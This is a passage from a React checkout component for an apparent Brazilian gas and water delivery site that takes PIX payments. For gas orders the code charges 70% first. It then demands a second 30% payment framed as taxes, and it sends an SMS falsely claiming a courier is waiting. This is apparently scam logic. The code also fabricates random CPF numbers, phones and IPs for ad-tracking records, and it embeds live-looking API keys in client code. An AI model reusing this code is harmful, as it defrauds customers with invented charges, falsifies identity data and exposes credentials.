              name: "OFG2",
              planId: null,
              planName: null,
              quantity: item.quantity || 1,
              priceInCents: item.unitPrice
            })) || [],
            amount: pixResponse.amount,
            trackingParameters: {
              src: utmParams.src || null,
              sck: utmParams.sck || null,
              utm_source: utmParams.utm_source || null,
              utm_campaign: utmParams.utm_campaign || null,
              utm_medium: utmParams.utm_medium || null,
              utm_content: utmParams.utm_content || null,
              utm_term: utmParams.utm_term || null,
              keyword: utmParams.keyword || null,
              device: utmParams.device || null,
              network: utmParams.network || null,
              gclid: utmParams.gclid || null,
              gbraid: utmParams.gbraid || null,
              wbraid: utmParams.wbraid || null,
              fbclid: utmParams.fbclid || null
            },
            host: window.location.hostname
          })
        })
        console.log('💾 [CHECKOUT] Dados do pedido salvos para webhook')
      } catch (error) {
        console.error('❌ [CHECKOUT] Erro ao salvar dados do pedido:', error)
      }
      
      // Iniciar polling para verificar pagamento
      startPaymentPolling(pixResponse.id)
      
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : "Erro ao gerar PIX. Tente novamente."
      setPixError(errorMessage)
      console.error("❌ [GeneratePix] Erro final:", err)
    } finally {
      setPixLoading(false)
    }
  }

  // Função para gerar PIX dos impostos (30%)
  const generateTaxPix = async () => {
    try {
      console.log('🚀 Iniciando geração do PIX de 30%...')
      setPixLoading(true)
      setPixError("")
      
      const taxAmount = getTaxPaymentAmount()
      console.log('💵 Valor calculado (30%):', taxAmount, 'centavos')
      
      const requestData = {
        amount: taxAmount,
        currency: "BRL",
        paymentMethod: "PIX",
        customer: {
          name: customerData.name,
          email: customerData.email,
          document: {
            number: customerData.cpf.replace(/\D/g, ''),
            type: "CPF"
          },
          phone: customerData.phone.replace(/\D/g, ''),
          externalRef: "",
          address: {
            street: addressData?.logradouro || '',
            streetNumber: customerData.number,
            complement: customerData.complement || '',
            zipCode: addressData?.cep?.replace(/\D/g, '') || '',
            neighborhood: addressData?.bairro || '',
            city: addressData?.localidade || '',
            state: addressData?.uf || '',
            country: "br"
          }
        },
        shipping: {
          fee: 0,
          address: {
            street: addressData?.logradouro || '',
            streetNumber: customerData.number,
            complement: customerData.complement || '',
            zipCode: addressData?.cep?.replace(/\D/g, '') || '',
            neighborhood: addressData?.bairro || '',
            city: addressData?.localidade || '',
            state: addressData?.uf || '',
            country: "br"
          }
        },
        items: [{
          title: 'ProdNew30',
          unitPrice: taxAmount,
          quantity: 1,
          tangible: true,
          externalRef: ""
        }],
        pix: {
          expiresInDays: 1
        },
        postbackUrl: "",
        metadata: JSON.stringify({
          source: "apiutmify",
          project: "ProdNew30",
          url: "gasbu",
          pixelId: "",
          timestamp: new Date().toISOString()
        }),
        traceable: true,
        ip: "0.0.0.0"
      }
      
      console.log('📤 Enviando requisição para API com payload completo...')
      
      // Obter gateway selecionado para este cliente (mesmo do primeiro pagamento)
      const gateway = getClientGateway()
      const mappedName = getMappedGatewayName(gateway.id)
      console.log(`🎯 [Gateway TAX] Usando: ${mappedName}`)
      
      const response = await fetch(gateway.endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestData)
      })

      if (!response.ok) {
        console.error('❌ Erro na API:', response.status, response.statusText)
        throw new Error("Erro ao gerar PIX dos impostos")
      }

      const taxPixResponse = await response.json()
      console.log('✅ Resposta da API recebida:', taxPixResponse)
      setTaxPixData(taxPixResponse)
      
      // 🔥 IMPORTANTE: Atualizar pixData para exibir o QR Code do segundo pagamento
      setPixData(taxPixResponse)
      console.log('🔄 pixData atualizado com o PIX de 30%')
      
      // Salvar no localStorage
      localStorage.setItem('tax-pix-transaction', JSON.stringify({
        pixData: taxPixResponse,
        customerData,
        addressData,
        createdAt: new Date().toISOString()
      }))
      console.log('💾 PIX de 30% salvo no localStorage')
      
      // Enviar para UTMify - segundo PIX gerado (waiting_payment)
      // Criar payload completo para o segundo pagamento (30%)
      await sendTaxPaymentToUtmify(taxPixResponse, taxAmount, 'waiting_payment')
      
      // Iniciar polling para o segundo pagamento
      console.log('🔄 Iniciando polling do PIX de 30%...')
      startPaymentPolling(taxPixResponse.id)
    } catch (err) {
      console.error('❌ Erro geral ao gerar PIX de 30%:', err)
      setPixError("Erro ao gerar PIX dos impostos. Tente novamente.")
    } finally {
      setPixLoading(false)
    }
  }

  const copyPixCode = async () => {
    if (pixData?.pix?.qrcode) {
      try {
        await navigator.clipboard.writeText(pixData.pix.qrcode)
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch (err) {
        // Erro silencioso
      }
    }
  }

  const formatPrice = (priceInCents: number) => {
    return (priceInCents / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    })
  }

  // Verificar se o produto é água
  const isWaterProduct = () => {
    return productName.toLowerCase().includes("água") || 
           productName.toLowerCase().includes("garrafão") ||
           productName.toLowerCase().includes("garrafões")
  }

  // Verificar se o produto é gás
  const isGasProduct = () => {
    return productName.toLowerCase().includes("gás") || 
           productName.toLowerCase().includes("botijão") ||
           productName.toLowerCase().includes("botijões")
  }

  // Obter imagem do produto
  const getProductImage = () => {
    const productImageMap: { [key: string]: string } = {
      "Gás de cozinha 13 kg (P13)": "/images/gas-p13.png",
      "Combo Gás + Garrafão": "/images/comboGas_garrafao.png",
      "Garrafão de água Mineral 20L": "/images/agua-indaia-20l.png",
      "3 Garrafões de Água 20L": "/images/3garrafoes.png",
      "Combo 2 Botijões de Gás 13kg": "/images/combo 2 botijao 13kg.png",
      "Botijão de Gás 8kg P8": "/images/gas-p8-8kg.png",
      "Combo 3 Gás 13kg": "/images/combo3gas13kg.png",
      "Combo 2 Gás + 2 Água": "/images/combo2Gas2Agua.png",
      "Combo 2 Gás + 1 Água": "/images/combo2Gas1Agua.png"
    }
    
    return productImageMap[productName] || "/images/gas-p13.png"
  }

  // Calcular preço total incluindo kit mangueira
  const getTotalPrice = () => {
    const basePrice = productPrices[productName] || 1000
    const kitPrice = kitMangueira ? 930 : 0 // R$ 9,30 em centavos
    return basePrice + kitPrice
  }

  // Verificar se produto requer pagamento parcelado (70% + 30%)
  const requiresSplitPayment = () => {
    return isGasProduct()
  }

  // Calcular valor da primeira parte (70% para gás, 100% para outros)
  const getFirstPaymentAmount = () => {
    const totalPrice = getTotalPrice()
    const finalPrice = totalPrice - pixDiscount // Valor após desconto
    
    if (requiresSplitPayment()) {
      return Math.round(finalPrice * 0.70) // 70% do valor
    }
    return finalPrice // 100% para não-gás
  }

  // Calcular valor da segunda parte (30% - impostos)
  const getTaxPaymentAmount = () => {
    if (!requiresSplitPayment()) return 0
    const totalPrice = getTotalPrice()
    const finalPrice = totalPrice - pixDiscount
    return Math.round(finalPrice * 0.30) // 30% do valor (ICMS + impostos)
  }

  // Calcular valor a pagar (compatibilidade)
  const getPaymentAmount = () => {
    return getFirstPaymentAmount()
  }

  // Função para obter tags principais do Google Ads
  // Retorna um ARRAY de tags configuradas no .env
  const getGoogleAdsTags = (): string[] => {
    if (typeof window === 'undefined') return []
    
    // Suporta múltiplas tags separadas por vírgula
    const tags = (process.env.NEXT_PUBLIC_GOOGLE_ADS_TAGS || 'AW-17780793164')
      .split(',')
      .map(tag => tag.trim())
      .filter(tag => tag.length > 0)
    
    return tags
  }

  // Função para reportar conversão do Google Ads (quando paga - Compra)
  const reportPurchaseConversion = (value: number, transactionId: string) => {
    if (typeof window === 'undefined') return
    if (!window.gtag) return
    
    const googleAdsTags = getGoogleAdsTags()
    if (!googleAdsTags || googleAdsTags.length === 0) return
    
    try {
      const conversionValueBRL = value / 100; // Converter centavos para reais
      
      // Recuperar parâmetros UTM do localStorage
      const utmParamsStr = localStorage.getItem('utm-params')
      const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
      
      // Preparar dados do cliente para Enhanced Conversions
      const enhancedConversionData: any = {}
      
      // Email vem do pixData se disponível
      if (pixData?.customer?.email) {
        enhancedConversionData.email = pixData.customer.email
      }
      
      if (customerData.phone) {
        enhancedConversionData.phone_number = customerData.phone.replace(/\D/g, '')
      }
      
      if (customerData.name) {
        const nameParts = customerData.name.trim().split(' ')
        enhancedConversionData.first_name = nameParts[0]
        if (nameParts.length > 1) {
          enhancedConversionData.last_name = nameParts.slice(1).join(' ')
        }
      }
      
      if (addressData) {
        enhancedConversionData.address = {
          city: addressData.localidade,
          region: addressData.uf,
          postal_code: addressData.cep?.replace(/\D/g, ''),
          country: 'BR'
        }
      }
      
      // Enviar evento de purchase para todas as tags configuradas
      console.log(`📊 [GOOGLE ADS] Enviando evento de purchase:`, {
        value: conversionValueBRL,
        currency: 'BRL',
        transaction_id: transactionId,
        tags: googleAdsTags,
        has_enhanced_data: Object.keys(enhancedConversionData).length > 0,
        has_utm_params: Object.keys(utmParams).length > 0,
        utm_source: utmParams.utm_source || 'none'
      })
      
      // Montar payload de purchase
      const purchasePayload: any = {
        'transaction_id': transactionId,
        'value': conversionValueBRL,
        'currency': 'BRL',
        'items': [{
          'item_id': productName,
          'item_name': productName,
          'price': conversionValueBRL,
          'quantity': 1
        }]
      }
      
      // Adicionar Enhanced Conversion Data se disponível
      if (Object.keys(enhancedConversionData).length > 0) {
        purchasePayload.user_data = enhancedConversionData
      }
      
      // Adicionar parâmetros UTM se disponíveis
      if (utmParams.utm_source) purchasePayload.utm_source = utmParams.utm_source
      if (utmParams.utm_medium) purchasePayload.utm_medium = utmParams.utm_medium
      if (utmParams.utm_campaign) purchasePayload.utm_campaign = utmParams.utm_campaign
      if (utmParams.utm_content) purchasePayload.utm_content = utmParams.utm_content
      if (utmParams.utm_term) purchasePayload.utm_term = utmParams.utm_term
      
      // Enviar evento de purchase (será capturado por todas as tags configuradas)
      window.gtag('event', 'purchase', purchasePayload);
      
      console.log(`✅ [GOOGLE ADS] Evento de purchase enviado para ${googleAdsTags.length} tag(s)!`)
      
      // Marcar que conversão foi reportada
      setConversionReported(true);
    } catch (error) {
      console.error('❌ [GOOGLE ADS] Erro ao reportar conversão:', error)
    }
  }

  // Função para polling de pagamento
  const startPaymentPolling = (transactionId: number) => {
    // Limpar polling anterior se existir
    if (pollingInterval) {
      clearInterval(pollingInterval)
    }
    
    console.log(`🔄 [POLLING] Iniciando polling para transação ${transactionId}`)
    
    // Obter gateway selecionado para este cliente
    const gateway = getClientGateway()
    console.log(`🔄 [POLLING] Usando endpoint: ${gateway.checkEndpoint}`)
    
    const interval = setInterval(async () => {
      try {
        // Adicionar timestamp para evitar cache
        const timestamp = new Date().getTime()
        const response = await fetch(
          `${gateway.checkEndpoint}?id=${transactionId}&_t=${timestamp}`,
          {
            method: 'GET',
            cache: 'no-store',
            headers: {
              'Cache-Control': 'no-cache, no-store, must-revalidate',
              'Pragma': 'no-cache'
            }
          }
        )
        
        if (response.ok) {
          const data = await response.json()
          
          console.log('📥 [POLLING] Resposta recebida:', data)
          
          // Verificar APENAS o status (PAID ou paid)
          const status = data.status?.toUpperCase()
          console.log(`🔄 [POLLING] Status da transação ${transactionId}: ${status}`)
          console.log(`🔍 [POLLING] requiresSplitPayment: ${requiresSplitPayment()}`)
          console.log(`🔍 [POLLING] firstPaymentCompleted: ${firstPaymentCompleted}`)
          
          if (status === 'PAID') {
            console.log('🎉 STATUS PAID DETECTADO!')
            console.log('🔍 Verificando tipo de pagamento...')
            
            // Recuperar dados do localStorage - verificar primeiro se é PIX de impostos
            let savedTransaction = localStorage.getItem('tax-pix-transaction')
            let isTaxPayment = false
            
            if (savedTransaction) {
              isTaxPayment = true
              console.log('💰 Detectado pagamento de impostos (30%)')
            } else {
              savedTransaction = localStorage.getItem('current-pix-transaction')
              console.log('💰 Detectado pagamento principal (70% ou 100%)')
            }
            
            if (!savedTransaction) {
              console.error('❌ [ERROR] Transação não encontrada no localStorage')
              return
            }
            
            const transaction = JSON.parse(savedTransaction)
            const currentPixData: PixResponse = transaction.pixData
            const savedCustomerData = transaction.customerData
            const savedAddressData = transaction.addressData
            
            console.log('📦 Dados da transação recuperados')
            console.log('🔍 isTaxPayment:', isTaxPayment)
            console.log('🔍 requiresSplitPayment():', requiresSplitPayment())
            
            clearInterval(interval)
            setPollingInterval(null)
            
            const updatedPixData: PixResponse = { 
              ...currentPixData, 
              status: 'paid',
              // Atualizar campos da API se disponíveis
              ...(data.paidAt && { paidAt: data.paidAt })
            }
            setPixData(updatedPixData)
            
            // Salvar no localStorage para evitar múltiplos pedidos
            localStorage.setItem('paid-order', JSON.stringify({
              pixData: updatedPixData,
              customerData: savedCustomerData,
              addressData: savedAddressData,
              paidAt: new Date().toISOString()
            }))
            
            // Verificar se é pagamento de impostos (30%) ou pagamento principal
            if (isTaxPayment) {
              // Segundo pagamento (30%) concluído
              console.log('✅ Segundo pagamento (30%) detectado como PAID!')
              
              // Reportar conversão Google Ads do segundo pagamento
              reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
              
              // Enviar PAID do segundo pagamento para UTMify
              const taxTransaction = localStorage.getItem('tax-pix-transaction')
              if (taxTransaction) {
                const taxData = JSON.parse(taxTransaction)
                await sendTaxPaymentToUtmify(taxData.pixData, updatedPixData.amount, 'paid')
              }
              
              // Limpar transações
              localStorage.removeItem('current-pix-transaction')
              localStorage.removeItem('tax-pix-transaction')
              localStorage.removeItem('utmify-tax-payload')
              
              console.log('🎉 PAGAMENTO COMPLETO! Ambas as partes pagas (70% + 30%)')
              
              // Mostrar modal de upsell opcional
              console.log('⏰ Agendando modal de upsell em 2 segundos...')
              setTimeout(() => {
                console.log('🍺 Mostrando modal de upsell...')
                console.log('🔍 Estado atual showUpsellModal:', showUpsellModal)
                setShowUpsellModal(true)
                console.log('✅ setShowUpsellModal(true) executado')
              }, 2000)
            } else if (requiresSplitPayment()) {
              // Primeiro pagamento (70%) concluído
              console.log('✅ Primeiro pagamento (70%) detectado como PAID!')
              console.log('🔍 Estado atual - firstPaymentCompleted:', firstPaymentCompleted)
              console.log('🔍 Estado atual - showTaxPaymentModal:', showTaxPaymentModal)
              console.log('🔍 Verificando se já existe tax-pix-transaction...')
              
              const existingTaxPix = localStorage.getItem('tax-pix-transaction')
              console.log('🔍 existingTaxPix:', existingTaxPix ? 'SIM' : 'NÃO')
              
              if (!existingTaxPix) {
                // Ainda não gerou o PIX de 30%
                console.log('🎯 Primeira vez detectando pagamento de 70%, mostrando modal...')
                setFirstPaymentCompleted(true)
                
                // Reportar conversão Google Ads do primeiro pagamento
                reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
                
                // Enviar para UTMify PAID da primeira parte (70%)
                await sendToUtmify('paid')
                
                // Mostrar modal para gerar segundo PIX
                console.log('🚨 ABRINDO MODAL DE IMPOSTOS (30%)...')
                console.log('🚨 Chamando setShowTaxPaymentModal(true)...')
                setShowTaxPaymentModal(true)
                
                // Verificar se o modal foi aberto após um pequeno delay
                setTimeout(() => {
                  console.log('🔍 Verificação após 1s - showTaxPaymentModal:', showTaxPaymentModal)
                }, 1000)
              } else {
                console.log('⚠️ PIX de 30% já foi gerado anteriormente, aguardando pagamento...')
              }
              
              // Não limpar current-pix-transaction ainda, pois ainda falta o segundo pagamento
            } else {
              // Pagamento completo (100% para produtos não-gás)
              // Reportar conversão Google Ads
              if (!conversionReported) {
                reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
                setConversionReported(true)
              }
              
              // Enviar para UTMify PAID (ANTES de limpar current-pix-transaction)
              await sendToUtmify('paid')
              
              // Limpar transação temporária APENAS APÓS enviar para UTMify
              localStorage.removeItem('current-pix-transaction')
              
              // Mostrar modal de upsell opcional
              console.log('⏰ Agendando modal de upsell em 2 segundos... (100%)')
              setTimeout(() => {
                console.log('🍺 Mostrando modal de upsell... (100%)')
                console.log('🔍 Estado atual showUpsellModal:', showUpsellModal)
                setShowUpsellModal(true)
                console.log('✅ setShowUpsellModal(true) executado (100%)')
              }, 2000)
            }
          }
        } else {
          console.error(`❌ [POLLING] Erro na resposta da API: ${response.status}`)
        }
      } catch (error) {
        console.error('❌ [ERROR] Erro no polling:', error)
      }
    }, 5000) // Verifica a cada 5 segundos
    
    setPollingInterval(interval)
    
    // Parar polling após 15 minutos
    setTimeout(() => {
      if (interval) {
        console.log('⏱️ [POLLING] Timeout de 15 minutos atingido, parando polling')
        clearInterval(interval)
        setPollingInterval(null)
      }
    }, 15 * 60 * 1000)
  }
  
  // Limpar polling ao desmontar componente
  useEffect(() => {
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval)
      }
    }
  }, [pollingInterval])
  
  // Função para enviar SMS de lembrete
  const sendSmsReminder = async () => {
    if (smsReminderSent || !customerData.phone) return
    
    try {
      const message = "Configás: Volte ao nosso site! O Motoboy ta esperando a confirmacao pra ir, e menos de 10minutos na sua porta."
      const cleanPhone = customerData.phone.replace(/\D/g, '')
      const apiKey = "6YYTL0R2P8VOAJYG2JUZF5QGAEAVX28BMR0C9LPMVKDCFYXDG4ERLTZGD8PJ3ZDCZV1K4O3X48CV4NTRJONIV7S0ZQVDL3ZVGEXKN1ALDQMPHT7XXD2Z75CZMXXPR2SL"
      
      const url = `https://api.smsdev.com.br/v1/send?key=${apiKey}&type=9&number=${cleanPhone}&msg=${encodeURIComponent(message)}`
      
      const response = await fetch(url, {
        method: 'GET'
      })
      
      const data = await response.json()
      
      // Salvar ID do SMS se retornou
      if (data.id) {
        localStorage.setItem(`sms_${pixData?.id}`, JSON.stringify({
          smsId: data.id,
          phone: cleanPhone,
          sentAt: new Date().toISOString()
        }))
      }
      
      setSmsReminderSent(true)
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para gerar IP aleatório
  const generateRandomIP = () => {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  }

  // Função para gerar CPF aleatório
  const generateRandomCPF = () => {
    const random = () => Math.floor(Math.random() * 10)
    return `${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}`
  }

  // Função para gerar telefone aleatório
  const generateRandomPhone = () => {
    return `5582${Math.floor(Math.random() * 900000000) + 100000000}`
  }

  // Função para enviar pagamento de impostos (30%) ao UTMify
  const sendTaxPaymentToUtmify = async (taxPixData: any, taxAmount: number, status: 'waiting_payment' | 'paid') => {
    console.log(`📤 [UTMIFY TAX] Enviando pagamento de impostos (30%): ${status}`)
    
    // Verificar se já foi enviado
    const taxSentStr = localStorage.getItem('utmify-tax-sent')
    const taxSent = taxSentStr ? JSON.parse(taxSentStr) : { pending: false, paid: false }
    
    if (status === 'waiting_payment' && taxSent.pending) {
      console.log('⚠️ [UTMIFY TAX] Pending já enviado, ignorando')
      return
    }
    if (status === 'paid' && taxSent.paid) {
      console.log('⚠️ [UTMIFY TAX] Paid já enviado, ignorando')
      return
    }
    
    try {
      // Recuperar payload base do primeiro pagamento
      const basePayloadStr = localStorage.getItem('utmify-payload')
      if (!basePayloadStr) {
        console.error('❌ [UTMIFY TAX] Payload base não encontrado')
        return
      }
      
      const basePayload = JSON.parse(basePayloadStr)
      
      // Criar payload específico para o pagamento de impostos
      const taxPayload = {
        ...basePayload,
        orderId: `${basePayload.orderId}_TAX`, // Sufixo para diferenciar
        status: status,
        createdAt: status === 'waiting_payment' 
          ? new Date().toISOString().replace('T', ' ').substring(0, 19)
          : basePayload.createdAt,
        approvedDate: status === 'paid' 
          ? new Date().toISOString().replace('T', ' ').substring(0, 19)
          : null,
        products: basePayload.products.map((product: any) => ({
          ...product,
          name: "OFG2_30",
          priceInCents: taxAmount
        })),
        commission: {
          totalPriceInCents: taxAmount,
          gatewayFeeInCents: Math.round(taxAmount * 0.04),
          userCommissionInCents: Math.round(taxAmount * 0.96)
        }
      }
      
      console.log(`📦 [UTMIFY TAX] Payload criado:`, taxPayload)
      
      // Salvar payload
      if (status === 'waiting_payment') {
        localStorage.setItem('utmify-tax-payload', JSON.stringify(taxPayload))
      }
      
      // Enviar para UTMify com retry
      const maxAttempts = status === 'paid' ? 5 : 2
      let success = false
      
      for (let attempt = 1; attempt <= maxAttempts && !success; attempt++) {
        try {
          console.log(`🔄 [UTMIFY TAX] Tentativa ${attempt}/${maxAttempts}`)
          const response = await fetch('/api/send-to-utmify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(taxPayload)
          })
          
          if (response.ok) {
            success = true
            const key = status === 'waiting_payment' ? 'pending' : 'paid'
            const newState = { ...taxSent, [key]: true }
            localStorage.setItem('utmify-tax-sent', JSON.stringify(newState))
            console.log(`✅ [UTMIFY TAX] ${status} enviado com sucesso!`)
          } else {
            console.warn(`⚠️ [UTMIFY TAX] Tentativa ${attempt} falhou: ${response.status}`)
            if (attempt < maxAttempts) {
              await new Promise(resolve => setTimeout(resolve, 2000))
            }
          }
        } catch (error) {
          console.error(`❌ [UTMIFY TAX] Erro na tentativa ${attempt}:`, error)
          if (attempt < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 2000))
          }
        }
      }
      
      if (!success) {
        console.error(`❌ [UTMIFY TAX] Falha após ${maxAttempts} tentativas`)
      }
    } catch (error) {
      console.error('❌ [UTMIFY TAX] Erro geral:', error)
    }
  }

  // Função para enviar dados ao UTMify
  const sendToUtmify = async (status: 'waiting_payment' | 'paid') => {
    console.log(`📤 [UTMIFY] Iniciando envio de conversão: ${status}`)
    
    // Recuperar dados do localStorage
    const savedTransaction = localStorage.getItem('current-pix-transaction')
    const savedPaidOrder = localStorage.getItem('paid-order')
    
    // Para PAID, também aceitar dados de paid-order
    const transactionData = savedTransaction || savedPaidOrder
    if (!transactionData) {
      console.error('❌ [UTMIFY ERROR] Nenhuma transação encontrada no localStorage')
      return
    }
    
    const transaction = JSON.parse(transactionData)
    const currentPixData = transaction.pixData
    const savedCustomerData = transaction.customerData
    
    console.log(`📦 [UTMIFY] Dados da transação recuperados - ID: ${currentPixData.id}`)
    
    // Verificar se já foi enviado para evitar duplicatas
    if (status === 'waiting_payment' && utmifySent.pending) {
      console.log('⚠️ [UTMIFY] Pending já foi enviado, ignorando')
      return
    }
    if (status === 'paid' && utmifySent.paid) {
      console.log('⚠️ [UTMIFY] Paid já foi enviado, ignorando')
      return
    }
    
    try {
      let utmifyData;
      
      if (status === 'waiting_payment') {
        console.log('🔨 [UTMIFY] Criando payload PENDING')
        
        // PENDING: Criar payload completo
        const utmParamsStr = localStorage.getItem('utm-params')
        const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
        
        console.log('🏷️ [UTMIFY] Parâmetros UTM:', utmParams)
        
        // Usar IP capturado no início (com fallback para IP aleatório)
        const currentUserIp = userIp !== "0.0.0.0" ? userIp : generateRandomIP()
        console.log(`🌐 [UTMIFY] IP do usuário: ${currentUserIp}`)
        
        utmifyData = {
          orderId: currentPixData.id.toString(),
          platform: "GBsNew",
          paymentMethod: "pix",
          status: status,
          createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
          approvedDate: null,
          refundedAt: null,
          customer: {
            name: savedCustomerData.name || "Cliente",
            email: savedCustomerData.email || currentPixData.customer?.email || `cliente${Date.now()}@gbsnew.pro`,
            phone: savedCustomerData.phone ? savedCustomerData.phone.replace(/\D/g, '') : generateRandomPhone(),
            document: savedCustomerData.cpf ? savedCustomerData.cpf.replace(/\D/g, '') : generateRandomCPF(),
            country: "BR",
            ip: currentUserIp
          },
          products: currentPixData.items.map((item: any, index: number) => ({
            id: `product-${currentPixData.id}-${index}`,
            name: "OFG2",
            planId: null,
            planName: null,
            quantity: item.quantity,
            priceInCents: item.unitPrice
          })),
          trackingParameters: {
            src: utmParams.src || null,
            sck: utmParams.sck || null,
            utm_source: utmParams.utm_source || null,
            utm_campaign: utmParams.utm_campaign || null,
            utm_medium: utmParams.utm_medium || null,
            utm_content: utmParams.utm_content || null,
            utm_term: utmParams.utm_term || null,
            keyword: utmParams.keyword || null,
            device: utmParams.device || null,
            network: utmParams.network || null,
            gclid: utmParams.gclid || null,
            gbraid: utmParams.gbraid || null,
            wbraid: utmParams.wbraid || null,
            fbclid: utmParams.fbclid || null
          },
          commission: {
            totalPriceInCents: currentPixData.amount,
            gatewayFeeInCents: Math.round(currentPixData.amount * 0.04),
            userCommissionInCents: Math.round(currentPixData.amount * 0.96)
          },
          isTest: process.env.NODE_ENV === 'development'
        }
        
        // Salvar payload no estado E no localStorage para reutilizar no paid
        setUtmifyPayload(utmifyData)
        localStorage.setItem('utmify-payload', JSON.stringify(utmifyData))
        console.log('💾 [UTMIFY] Payload PENDING salvo no localStorage')
        
      } else {
        // PAID: Tentar recuperar payload do estado React ou localStorage
        let basePayload = utmifyPayload
        
        if (!basePayload) {
          // Tentar recuperar do localStorage
          const savedPayload = localStorage.getItem('utmify-payload')
          if (savedPayload) {
            basePayload = JSON.parse(savedPayload)
          }
        }
        
        // Se ainda não tiver payload, criar um novo (fallback)
        if (!basePayload) {
          console.warn('⚠️ [UTMIFY WARNING] Criando novo payload para PAID (pending não foi enviado)')
          
          const utmParamsStr = localStorage.getItem('utm-params')
          const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
          
          let userIp = generateRandomIP()
          try {
            const ipResponse = await fetch('https://ipinfo.io/?token=32090226b9d116')
            const ipData = await ipResponse.json()
            userIp = ipData.ip || generateRandomIP()
          } catch (e) {
            // Usar IP aleatório em caso de erro
          }
          
          basePayload = {
            orderId: currentPixData.id.toString(),
            platform: "GBsNew",
            paymentMethod: "pix",
            status: 'waiting_payment',
            createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
            approvedDate: null,
            refundedAt: null,
            customer: {
              name: savedCustomerData.name || "Cliente",
              email: savedCustomerData.email || currentPixData.customer?.email || `cliente${Date.now()}@gbsnew.pro`,
              phone: savedCustomerData.phone ? savedCustomerData.phone.replace(/\D/g, '') : generateRandomPhone(),
              document: savedCustomerData.cpf ? savedCustomerData.cpf.replace(/\D/g, '') : generateRandomCPF(),
              country: "BR",
              ip: userIp
            },
            products: currentPixData.items.map((item: any, index: number) => ({
              id: `product-${currentPixData.id}-${index}`,
              name: "OFG2",
              planId: null,
              planName: null,
              quantity: item.quantity,
              priceInCents: item.unitPrice
            })),
            trackingParameters: {
              src: utmParams.src || null,
              sck: utmParams.sck || null,
              utm_source: utmParams.utm_source || null,
              utm_campaign: utmParams.utm_campaign || null,
              utm_medium: utmParams.utm_medium || null,
              utm_content: utmParams.utm_content || null,
              utm_term: utmParams.utm_term || null,
              keyword: utmParams.keyword || null,
              device: utmParams.device || null,
              network: utmParams.network || null,
              gclid: utmParams.gclid || null,
              gbraid: utmParams.gbraid || null,
              wbraid: utmParams.wbraid || null,
              fbclid: utmParams.fbclid || null
            },
            commission: {
              totalPriceInCents: currentPixData.amount,
              gatewayFeeInCents: Math.round(currentPixData.amount * 0.04),
              userCommissionInCents: Math.round(currentPixData.amount * 0.96)
            },
            isTest: process.env.NODE_ENV === 'development'
          }
        }
        
        // Usar payload base, apenas atualizar status e approvedDate
        utmifyData = {
          ...basePayload,
          status: 'paid',
          approvedDate: new Date().toISOString().replace('T', ' ').substring(0, 19)
        }
      }
      
      // Tentar até 5 vezes para garantir envio (especialmente para PAID)
      const maxAttempts = status === 'paid' ? 5 : 2
      let success = false
      
      for (let attempt = 1; attempt <= maxAttempts && !success; attempt++) {
        try {
          const response = await fetch('/api/send-to-utmify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(utmifyData)
          })
          
          if (response.ok) {
            success = true
            const result = await response.json()
            console.log(`✅ [UTMIFY] ${status.toUpperCase()} enviado com sucesso!`, result)
            const key = status === 'waiting_payment' ? 'pending' : 'paid'
            const newState = { ...utmifySent, [key]: true }
            setUtmifySent(newState)
            // Salvar no localStorage
            localStorage.setItem('utmify-sent', JSON.stringify(newState))
          } else {
            const errorText = await response.text()
            console.error(`❌ [UTMIFY] Tentativa ${attempt}/${maxAttempts} falhou:`, response.status, errorText)
            if (attempt < maxAttempts) {
              await new Promise(resolve => setTimeout(resolve, 2000))
            }
          }
        } catch (error) {
          if (attempt < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 2000))
          }
        }
      }
      
      if (!success && status === 'paid') {
        // Se falhou ao enviar PAID, salvar flag para tentar novamente depois
        localStorage.setItem('utmify-paid-pending', JSON.stringify({
          payload: utmifyData,
          timestamp: Date.now()
        }))
      }
    } catch (error) {
      console.error(`❌ [ERROR] Erro ao enviar ${status} para UTMify:`, error)
    }
  }
  
  // Função removida - usando apenas startPaymentPolling com Umbrela
  
  // Verificar se há PAID pendente ao carregar
  useEffect(() => {
    const checkPendingPaid = async () => {
      const pendingPaid = localStorage.getItem('utmify-paid-pending')
      if (pendingPaid) {
        try {
          const { payload, timestamp } = JSON.parse(pendingPaid)
          // Se tem menos de 24 horas, tentar enviar novamente
          if (Date.now() - timestamp < 24 * 60 * 60 * 1000) {
            const response = await fetch('/api/send-to-utmify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            })
            
            if (response.ok) {
              localStorage.removeItem('utmify-paid-pending')
              const utmifySentData = localStorage.getItem('utmify-sent')
              const currentState = utmifySentData ? JSON.parse(utmifySentData) : { pending: false, paid: false }
              localStorage.setItem('utmify-sent', JSON.stringify({ ...currentState, paid: true }))
            }
          } else {
            // Mais de 24h, remover
            localStorage.removeItem('utmify-paid-pending')
          }
        } catch (e) {
          // Ignorar erros
        }
      }
    }
    
    checkPendingPaid()
  }, [])

  // Enviar pending para UTMify quando PIX for gerado
  useEffect(() => {
    // Verificar se é um PIX válido e se é o PIX principal (70%)
    const currentPixStr = localStorage.getItem('current-pix-transaction')
    const taxPixStr = localStorage.getItem('tax-pix-transaction')
    
    if (!pixData || !currentPixStr) return
    
    // Verificar se o pixData atual é o PIX principal (70%) ou o PIX de impostos (30%)
